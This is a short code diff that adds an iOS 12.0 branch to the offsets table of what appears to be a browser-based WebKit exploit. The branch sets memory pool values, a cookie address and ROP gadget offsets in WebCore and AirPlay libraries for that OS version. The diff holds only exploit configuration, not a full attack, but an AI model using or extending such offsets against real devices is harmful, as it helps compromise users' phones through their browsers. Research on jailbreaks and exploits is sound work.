@@ -25,6 +25,14 @@ const offsets_obj = {
             this.webcore_libcpp_ref_gadget_off = 0x9d000;
             this.airplay_dispatch_ref_gadget_off = 0x29000;
         }
+         else if (navigator.userAgent.match(/OS 12_0(_\d+)?/)) {
+            log("[i] offsets selected for iOS 12.0+");
+            this.memPoolStart = 0;
+            this.memPoolEnd = 0;
+            this.cookieAddr = (0x9AC60 + 0x38);
+            this.webcore_libcpp_ref_gadget_off = 0x9e000;
+            this.airplay_dispatch_ref_gadget_off = 0x29000;
+        }
         else {
             throw "Unknown platform: " + navigator.userAgent;
         }
